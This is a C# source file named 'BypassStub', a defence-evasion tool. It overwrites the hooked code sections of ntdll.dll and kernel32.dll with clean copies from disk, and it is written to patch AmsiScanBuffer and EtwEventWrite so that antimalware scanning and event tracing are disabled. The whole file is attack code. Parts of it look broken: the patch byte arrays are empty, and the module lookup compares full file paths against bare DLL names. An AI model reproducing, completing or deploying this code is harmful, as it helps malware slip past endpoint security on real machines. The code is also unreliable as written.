using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace BypassStub
{
    internal class Program
    {
        static Process currentProcess = Process.GetCurrentProcess();

        static void Main()
        {
            Unhook("ntdll.dll");
            if (Environment.OSVersion.Version.Major >= 10 || IntPtr.Size == 8)
            {
                Unhook("kernel32.dll");
            }
            Unhook2("amsi.dll", "AmsiScanBuffer", new byte[] { }, new byte[] { });
            Unhook2("ntdll.dll", "EtwEventWrite", new byte[] { }, new byte[] { });
        }

        static void Unhook2(string name, string fname, byte[] patch64, byte[] patch86)
        {
            byte[] patch;
            uint old;
            try
            {
                IntPtr addr = GetLibraryAddress(name, fname);
                if (addr == IntPtr.Zero)
                    throw new Exception();

                if (IntPtr.Size == 8)
                    patch = patch64;
                else
                    patch = patch86;
                VirtualProtect(addr, (IntPtr)patch.Length, 0x40, out old);
                Marshal.Copy(patch, 0, addr, patch.Length);
                VirtualProtect(addr, (IntPtr)patch.Length, old, out old);
            }
            catch { }
        }

        static unsafe void Unhook(string a)
        {
            try
            {
                bool wow64;
                IsWow64Process(currentProcess.Handle, out wow64);

                string systemDirectory = Environment.SystemDirectory + "\\";
                if (wow64 && IntPtr.Size == 4)
                {
                    systemDirectory = Environment.GetEnvironmentVariable("SystemRoot") + "\\SysWOW64\\";
                }

                IntPtr dll = GetLoadedModuleAddress(a);
                if (dll == IntPtr.Zero) return;
                MODULEINFO moduleInfo;
                if (!GetModuleInformation(currentProcess.Handle, dll, out moduleInfo, (uint)sizeof(MODULEINFO))) return;

                IntPtr dllFile = CreateFileA(systemDirectory + a, 0x80000000, 1, IntPtr.Zero, 3, 0, IntPtr.Zero);
                if (dllFile == (IntPtr)(-1))
                {
                    CloseHandle(dllFile);
                    return;
                }

                IntPtr dllMapping = CreateFileMapping(dllFile, IntPtr.Zero, 0x1000002, 0, 0, null);
                if (dllMapping == IntPtr.Zero)
                {
                    CloseHandle(dllMapping);
                    return;
                }

                IntPtr dllMappedFile = MapViewOfFile(dllMapping, 4, 0, 0, IntPtr.Zero);
                if (dllMappedFile == IntPtr.Zero) return;

                int ntHeaders = Marshal.ReadInt32((IntPtr)((long)moduleInfo.BaseOfDll + 0x3c));
                short numberOfSections = Marshal.ReadInt16((IntPtr)((long)dll + ntHeaders + 0x6));
                short sizeOfOptionalHeader = Marshal.ReadInt16(dll, ntHeaders + 0x14);

                for (short i = 0; i < numberOfSections; i++)
                {
                    IntPtr sectionHeader = (IntPtr)((long)dll + ntHeaders + 0x18 + sizeOfOptionalHeader + i * 0x28);
                    if (Marshal.ReadByte(sectionHeader) == '.' &&
                        Marshal.ReadByte((IntPtr)((long)sectionHeader + 1)) == 't' &&
                        Marshal.ReadByte((IntPtr)((long)sectionHeader + 2)) == 'e' &&
                        Marshal.ReadByte((IntPtr)((long)sectionHeader + 3)) == 'x' &&
                        Marshal.ReadByte((IntPtr)((long)sectionHeader + 4)) == 't')
                    {
                        int virtualAddress = Marshal.ReadInt32((IntPtr)((long)sectionHeader + 0xc));
                        uint virtualSize = (uint)Marshal.ReadInt32((IntPtr)((long)sectionHeader + 0x8));
                        uint oldProtect;
                        VirtualProtect((IntPtr)((long)dll + virtualAddress), (IntPtr)virtualSize, 0x40, out oldProtect);
                        memcpy((IntPtr)((long)dll + virtualAddress), (IntPtr)((long)dllMappedFile + virtualAddress), (IntPtr)virtualSize);
                        VirtualProtect((IntPtr)((long)dll + virtualAddress), (IntPtr)virtualSize, oldProtect, out oldProtect);
                        break;
                    }
                }

                CloseHandle(dllMapping);
                CloseHandle(dllFile);
                FreeLibrary(dll);
            }
            catch { }
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct MODULEINFO
        {
            public IntPtr BaseOfDll;
            public uint SizeOfImage;
            public IntPtr EntryPoint;
        }

        static CloseHandleD CloseHandle = GetFunctionPointer<CloseHandleD>("kernel32.dll", "CloseHandle");
        static FreeLibraryD FreeLibrary = GetFunctionPointer<FreeLibraryD>("kernel32.dll", "FreeLibrary");
        static VirtualProtectD VirtualProtect = GetFunctionPointer<VirtualProtectD>("kernel32.dll", "VirtualProtect");
        static CreateFileAD CreateFileA = GetFunctionPointer<CreateFileAD>("kernel32.dll", "CreateFileA");
        static CreateFileMappingD CreateFileMapping = GetFunctionPointer<CreateFileMappingD>("kernel32.dll", "CreateFileMappingA");
        static MapViewOfFileD MapViewOfFile = GetFunctionPointer<MapViewOfFileD>("kernel32.dll", "MapViewOfFile");
        static memcpyD memcpy = GetFunctionPointer<memcpyD>("msvcrt.dll", "memcpy");
        static GetModuleInformationD GetModuleInformation = GetFunctionPointer<GetModuleInformationD>("psapi.dll", "GetModuleInformation");
        static IsWow64ProcessD IsWow64Process = GetFunctionPointer<IsWow64ProcessD>("kernel32.dll", "IsWow64Process");

        private delegate bool CloseHandleD(IntPtr handle);
        private delegate bool FreeLibraryD(IntPtr module);
        private delegate int VirtualProtectD(IntPtr address, IntPtr size, uint newProtect, out uint oldProtect);
        private delegate IntPtr CreateFileAD(string fileName, uint desiredAccess, uint shareMode, IntPtr securityAttributes, uint creationDisposition, uint flagsAndAttributes, IntPtr templateFile);
        private delegate IntPtr CreateFileMappingD(IntPtr file, IntPtr fileMappingAttributes, uint protect, uint maximumSizeHigh, uint maximumSizeLow, string name);
        private delegate IntPtr MapViewOfFileD(IntPtr fileMappingObject, uint desiredAccess, uint fileOffsetHigh, uint fileOffsetLow, IntPtr numberOfBytesToMap);
        private delegate IntPtr memcpyD(IntPtr dest, IntPtr src, IntPtr count);
        private delegate bool GetModuleInformationD(IntPtr process, IntPtr module, out MODULEINFO moduleInfo, uint size);
        private delegate bool IsWow64ProcessD([In] IntPtr hProcess, [Out] out bool wow64Process);

        private static T GetFunctionPointer<T>(string moduleName, string functionName)
        {
            IntPtr moduleHandle = GetLoadedModuleAddress(moduleName);
            IntPtr functionPointer = GetExportAddress(moduleHandle, functionName);
            return Marshal.GetDelegateForFunctionPointer<T>(functionPointer);
        }

        public static IntPtr GetLibraryAddress(string DLLName, string FunctionName)
        {
            return GetExportAddress(GetLoadedModuleAddress(DLLName), FunctionName);
        }

        public static IntPtr GetLoadedModuleAddress(string DLLName)
        {
            ProcessModuleCollection ProcModules = currentProcess.Modules;
            foreach (ProcessModule Mod in ProcModules)
            {
                if (Mod.FileName.Equals(DLLName, StringComparison.OrdinalIgnoreCase))
                {
                    return Mod.BaseAddress;
                }
            }
            return IntPtr.Zero;
        }

        public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName)
        {
            IntPtr FunctionPtr = IntPtr.Zero;
            try
            {
                // Traverse the PE header in memory
                Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
                Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
                Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
                Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
                Int64 pExport = 0;
                if (Magic == 0x010b)
                {
                    pExport = OptHeader + 0x60;
                }
                else
                {
                    pExport = OptHeader + 0x70;
                }

                // Read -> IMAGE_EXPORT_DIRECTORY
                Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
                Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
                Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
                Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
                Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
                Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
                Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

                // Loop the array of export name RVA's
                for (int i = 0; i < NumberOfNames; i++)
                {
                    string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                    if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))
                    {
                        Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                        Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                        FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
                        break;
                    }
                }
            }
            catch
            {
                // Catch parser failure
                throw new InvalidOperationException();
            }

            if (FunctionPtr == IntPtr.Zero)
            {
                // Export not found
                throw new MissingMethodException();
            }
            return FunctionPtr;
        }
    }
}